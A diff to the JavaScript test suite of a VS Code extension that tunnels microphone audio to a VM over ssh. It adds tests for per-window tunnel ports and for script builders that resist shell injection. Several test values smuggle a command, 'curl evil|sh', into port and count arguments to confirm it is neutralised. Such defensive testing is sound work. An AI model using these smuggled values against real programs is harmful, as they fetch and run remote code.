@@ -109,6 +109,7 @@ const GATE_SNIPPET =
   eq("BYTES_PER_FRAME = 2 (mono S16)", a.BYTES_PER_FRAME, 2);
   ok("FORMAT is frozen", Object.isFrozen(a.FORMAT));
   eq("DEFAULT_VM_PORT 8767", a.DEFAULT_VM_PORT, 8767);
+  eq("DEFAULT_VM_PORT_COUNT 8 (one tunnel port per VS Code window)", a.DEFAULT_VM_PORT_COUNT, 8);
   eq("REC_SHIM_PATH", a.REC_SHIM_PATH, "/usr/local/bin/rec");
   eq("ARECORD_SHIM_PATH", a.ARECORD_SHIM_PATH, "/usr/local/bin/arecord");
   // The recorder argv matches Claude's contract EXACTLY.
@@ -130,12 +131,39 @@ const GATE_SNIPPET =
   eq("port: undefined -> default", a.normalizePort(undefined, 8767), 8767);
 })();
 
+// ── normalizeCount / parseBusyPorts / portCandidates (multi-window ports) ────
+(() => {
+  eq("count: valid passes through", a.normalizeCount(4, 8), 4);
+  eq("count: 1 boundary", a.normalizeCount(1, 8), 1);
+  eq("count: 16 boundary", a.normalizeCount(16, 8), 16);
+  eq("count: 0 -> default", a.normalizeCount(0, 8), 8);
+  eq("count: 17 -> default", a.normalizeCount(17, 8), 8);
+  eq("count: string injection -> default", a.normalizeCount("8; sh", 8), 8);
+  eq("count: null/undefined -> default", a.normalizeCount(null, 8), 8);
+
+  eq("busy: parses csv", JSON.stringify(a.parseBusyPorts("CONSTRUCT_GATE_PATCHED=1\nCONSTRUCT_PORTS_BUSY=8767,8768\n")), "[8767,8768]");
+  eq("busy: single port", JSON.stringify(a.parseBusyPorts("CONSTRUCT_PORTS_BUSY=8767\n")), "[8767]");
+  eq("busy: blank value -> []", JSON.stringify(a.parseBusyPorts("CONSTRUCT_PORTS_BUSY=\n")), "[]");
+  eq("busy: missing line -> []", JSON.stringify(a.parseBusyPorts("CONSTRUCT_GATE_PATCHED=1\n")), "[]");
+  eq("busy: null/empty stdout -> []", JSON.stringify(a.parseBusyPorts(null)), "[]");
+  eq("busy: garbage tokens dropped", JSON.stringify(a.parseBusyPorts("CONSTRUCT_PORTS_BUSY=evil")), "[]");
+  eq("busy: out-of-range port dropped", JSON.stringify(a.parseBusyPorts("CONSTRUCT_PORTS_BUSY=8767,99999")), "[8767]");
+
+  eq("candidates: full range when none busy", JSON.stringify(a.portCandidates(8767, 3, [])), "[8767,8768,8769]");
+  eq("candidates: busy ports skipped (other windows' tunnels)", JSON.stringify(a.portCandidates(8767, 3, [8767, 8768])), "[8769]");
+  eq("candidates: all busy -> []", JSON.stringify(a.portCandidates(8767, 2, [8767, 8768])), "[]");
+  eq("candidates: hostile base/count -> defaults", a.portCandidates("evil", "evil", []).length, a.DEFAULT_VM_PORT_COUNT);
+  eq("candidates: hostile base starts at default", a.portCandidates("evil", 2, [])[0], a.DEFAULT_VM_PORT);
+  eq("candidates: non-array busy tolerated", JSON.stringify(a.portCandidates(8767, 2, "junk")), "[8767,8768]");
+})();
+
 // ── Script builders: base64-as-data, injection-safety ────────────────────────
 (() => {
   const shim = "#!/usr/bin/env bash\n# shim\nexit 0\n";
   const enableTxt = "#!/usr/bin/env bash\n# enable\nexit 0\n";
-  const script = a.buildEnableScript(enableTxt, shim, 8767);
-  ok("enable-script: sets validated integer port", script.indexOf("CONSTRUCT_VM_PORT=8767") !== -1);
+  const script = a.buildEnableScript(enableTxt, shim, 8767, 8);
+  ok("enable-script: sets validated integer port base", script.indexOf("CONSTRUCT_VM_PORT_BASE=8767") !== -1);
+  ok("enable-script: sets validated integer port count", script.indexOf("CONSTRUCT_VM_PORT_COUNT=8") !== -1);
   ok("enable-script: embeds shim as base64 data", script.indexOf(a.b64(shim)) !== -1);
   ok("enable-script: embeds enable script as base64 data", script.indexOf(a.b64(enableTxt)) !== -1);
   // The RAW shim text must NOT appear literally (it rides as base64), so nothing in
@@ -144,9 +172,10 @@ const GATE_SNIPPET =
   ok("enable-script: decodes + runs via mktemp/base64 -d/bash", /base64 -d .*bash "\$f"/.test(script));
   ok("enable-script: propagates the inner exit code", script.indexOf("exit $rc") !== -1);
 
-  // A hostile port can't inject — it's coerced to the default integer.
-  const evil = a.buildEnableScript(enableTxt, shim, "8767; curl evil|sh");
-  ok("enable-script: hostile port coerced to default (no injection)", evil.indexOf("CONSTRUCT_VM_PORT=8767") !== -1);
+  // Hostile port/count can't inject — both are coerced to the default integers.
+  const evil = a.buildEnableScript(enableTxt, shim, "8767; curl evil|sh", "8; curl evil|sh");
+  ok("enable-script: hostile port coerced to default (no injection)", evil.indexOf("CONSTRUCT_VM_PORT_BASE=8767") !== -1);
+  ok("enable-script: hostile count coerced to default (no injection)", evil.indexOf("CONSTRUCT_VM_PORT_COUNT=8") !== -1);
   ok("enable-script: hostile port string absent", evil.indexOf("curl evil") === -1);
 
   // A shim containing shell metacharacters / quotes is fully neutralised by base64.
@@ -156,10 +185,18 @@ const GATE_SNIPPET =
   ok("enable-script: nasty shim recoverable from its base64", Buffer.from(a.b64(nasty), "base64").toString("utf8") === nasty);
 
   const disableTxt = "#!/usr/bin/env bash\n# disable\nexit 0\n";
-  const dscript = a.buildDisableScript(disableTxt);
+  const dscript = a.buildDisableScript(disableTxt, 8768, 8767, 8);
   ok("disable-script: embeds disable script as base64 data", dscript.indexOf(a.b64(disableTxt)) !== -1);
   ok("disable-script: raw disable text not interpolated", dscript.indexOf("# disable") === -1);
   ok("disable-script: decodes + runs + exits with inner code", /base64 -d .*bash "\$f"/.test(dscript) && dscript.indexOf("exit $rc") !== -1);
+  ok("disable-script: carries the self tunnel port (last-window-out guard)", dscript.indexOf("CONSTRUCT_TUNNEL_SELF_PORT=8768") !== -1);
+  ok("disable-script: carries the port range", dscript.indexOf("CONSTRUCT_VM_PORT_BASE=8767") !== -1 && dscript.indexOf("CONSTRUCT_VM_PORT_COUNT=8") !== -1);
+  // No self port (an enable() rollback whose tunnel never bound) → 0; hostile → 0.
+  const dnone = a.buildDisableScript(disableTxt);
+  ok("disable-script: no self port -> 0", dnone.indexOf("CONSTRUCT_TUNNEL_SELF_PORT=0") !== -1);
+  const devil = a.buildDisableScript(disableTxt, "8768; curl evil|sh", "evil", "evil");
+  ok("disable-script: hostile self port coerced to 0 (no injection)", devil.indexOf("CONSTRUCT_TUNNEL_SELF_PORT=0") !== -1 && devil.indexOf("curl evil") === -1);
+  ok("disable-script: hostile range coerced to defaults", devil.indexOf("CONSTRUCT_VM_PORT_BASE=8767") !== -1 && devil.indexOf("CONSTRUCT_VM_PORT_COUNT=8") !== -1);
 })();
 
 // ── b64 helper ───────────────────────────────────────────────────────────────
@@ -593,7 +630,8 @@ function fakeSocket() {
     });
     const r = await h.enable();
     ok("hostaudio enable: ok", r.ok === true);
-    ok("hostaudio enable: ran the enable script over ssh", fs.calls.length === 1 && fs.calls[0].script.indexOf("CONSTRUCT_VM_PORT=8767") !== -1);
+    ok("hostaudio enable: ran the enable script over ssh", fs.calls.length === 1 && fs.calls[0].script.indexOf("CONSTRUCT_VM_PORT_BASE=8767") !== -1);
+    ok("hostaudio enable: enable script carries the range size", fs.calls[0].script.indexOf("CONSTRUCT_VM_PORT_COUNT=8") !== -1);
     ok("hostaudio enable: spawned ssh -R tunnel", sink.file === "ssh" && sink.args.indexOf("-R") !== -1);
     ok("hostaudio enable: tunnel forwards to the chosen host port", sink.args[sink.args.indexOf("-R") + 1] === "8767:127.0.0.1:55555");
     ok("hostaudio enable: reported enabled with tunnel label", statuses.some((s) => s.enabled === true && /vm:8767/.test(s.tunnel || "")));
@@ -742,6 +780,90 @@ function fakeSocket() {
     ok("hostaudio double-enable: no second enable script", fs.calls.length === 1);
     ok("hostaudio double-enable: reports ok (already enabled)", r2.ok === true);
     h.dispose();
+  }
+
+  // ── Multi-window: per-window tunnel ports ────────────────────────────────────
+  // A spawner that records EVERY spawn and lets the test script per-attempt death
+  // (an early exit = the ExitOnForwardFailure signal for "port already bound").
+  function fakeMultiSpawner(sink, dieFirstN) {
+    let attempt = 0;
+    return (file, args) => {
+      const n = attempt++;
+      sink.push({ file, args });
+      const child = new EventEmitter();
+      child.kill = () => {};
+      if (n < dieFirstN) setImmediate(() => child.emit("exit", 1));
+      return child;
+    };
+  }
+  // The VM reports 8767 busy (another window's live tunnel) → this window binds 8768.
+  {
+    const fs = fakeSsh([{ code: 0, stdout: "CONSTRUCT_GATE_PATCHED=1\nCONSTRUCT_PORTS_BUSY=8767\n", stderr: "" }]);
+    const spawns = [];
+    const statuses = [];
+    const h = new a.HostAudio({
+      _ssh: fs, _spawn: fakeMultiSpawner(spawns, 0), _net: fakeNet().net, _readScript: readScript,
+      _hasKey: () => true, mic: () => () => {}, onStatus: (s) => statuses.push(s), _tunnelSettleMs: 5,
+    });
+    const r = await h.enable();
+    ok("multiwindow busy: enable ok", r.ok === true);
+    eq("multiwindow busy: skipped the busy port, one spawn", spawns.length, 1);
+    eq("multiwindow busy: tunnel bound the next range port", spawns[0].args[spawns[0].args.indexOf("-R") + 1], "8768:127.0.0.1:55555");
+    eq("multiwindow busy: boundPort records the winner", h.boundPort, 8768);
+    ok("multiwindow busy: status label shows the ACTUAL port", statuses.some((s) => s.enabled === true && /vm:8768/.test(s.tunnel || "")));
+    h.dispose();
+    eq("multiwindow busy: dispose clears boundPort", h.boundPort, null);
+  }
+  // Bind RACE: nothing reported busy, but another window grabs 8767 between the
+  // report and our bind — the first ssh dies early, the next candidate wins.
+  {
+    const fs = fakeSsh([0]);
+    const spawns = [];
+    const h = new a.HostAudio({
+      _ssh: fs, _spawn: fakeMultiSpawner(spawns, 1), _net: fakeNet().net, _readScript: readScript,
+      _hasKey: () => true, mic: () => () => {}, _tunnelSettleMs: 30,
+    });
+    const r = await h.enable();
+    ok("multiwindow race: enable ok after retry", r.ok === true);
+    eq("multiwindow race: two spawn attempts", spawns.length, 2);
+    eq("multiwindow race: first attempt was the base port", spawns[0].args[spawns[0].args.indexOf("-R") + 1], "8767:127.0.0.1:55555");
+    eq("multiwindow race: retry took the next port", spawns[1].args[spawns[1].args.indexOf("-R") + 1], "8768:127.0.0.1:55555");
+    eq("multiwindow race: boundPort is the survivor", h.boundPort, 8768);
+    h.dispose();
+  }
+  // EVERY range port busy → no-free-port, no spawn, VM rollback still attempted
+  // (guarded on the VM side — it leaves the shim/patch alone while others are live).
+  {
+    const allBusy = "CONSTRUCT_PORTS_BUSY=8767,8768,8769,8770,8771,8772,8773,8774\n";
+    const fs = fakeSsh([{ code: 0, stdout: allBusy, stderr: "" }, 0]);
+    const spawns = [];
+    const statuses = [];
+    const h = new a.HostAudio({
+      _ssh: fs, _spawn: fakeMultiSpawner(spawns, 0), _net: fakeNet().net, _readScript: readScript,
+      _hasKey: () => true, mic: () => () => {}, onStatus: (s) => statuses.push(s), _tunnelSettleMs: 5,
+    });
+    const r = await h.enable();
+    eq("multiwindow all-busy: error=no-free-port", r.error, "no-free-port");
+    eq("multiwindow all-busy: no tunnel spawned", spawns.length, 0);
+    ok("multiwindow all-busy: ran the (guarded) remote disable", fs.calls.length === 2 && fs.calls[1].script.indexOf("CONSTRUCT_DISABLE_B64") !== -1);
+    ok("multiwindow all-busy: rollback carries NO self port (tunnel never bound)", fs.calls[1].script.indexOf("CONSTRUCT_TUNNEL_SELF_PORT=0") !== -1);
+    ok("multiwindow all-busy: reported disabled with the honest error", statuses.some((s) => s.enabled === false && s.error === "no-free-port"));
+  }
+  // disable() hands the VM script the port OUR tunnel held, so the last-window-out
+  // guard can wait for it to clear before deciding whether to clean up.
+  {
+    const fs = fakeSsh([{ code: 0, stdout: "CONSTRUCT_PORTS_BUSY=8767\n", stderr: "" }, 0]);
+    const spawns = [];
+    const h = new a.HostAudio({
+      _ssh: fs, _spawn: fakeMultiSpawner(spawns, 0), _net: fakeNet().net, _readScript: readScript,
+      _hasKey: () => true, mic: () => () => {}, _tunnelSettleMs: 5,
+    });
+    await h.enable();
+    eq("multiwindow disable: bound 8768 first", h.boundPort, 8768);
+    await h.disable();
+    ok("multiwindow disable: disable script carries our port as self", fs.calls[1].script.indexOf("CONSTRUCT_TUNNEL_SELF_PORT=8768") !== -1);
+    ok("multiwindow disable: disable script carries the range", fs.calls[1].script.indexOf("CONSTRUCT_VM_PORT_BASE=8767") !== -1 && fs.calls[1].script.indexOf("CONSTRUCT_VM_PORT_COUNT=8") !== -1);
+    eq("multiwindow disable: boundPort cleared", h.boundPort, null);
   }
   // readScript throwing (missing vm file) is caught → error=exception, rollback.
   {
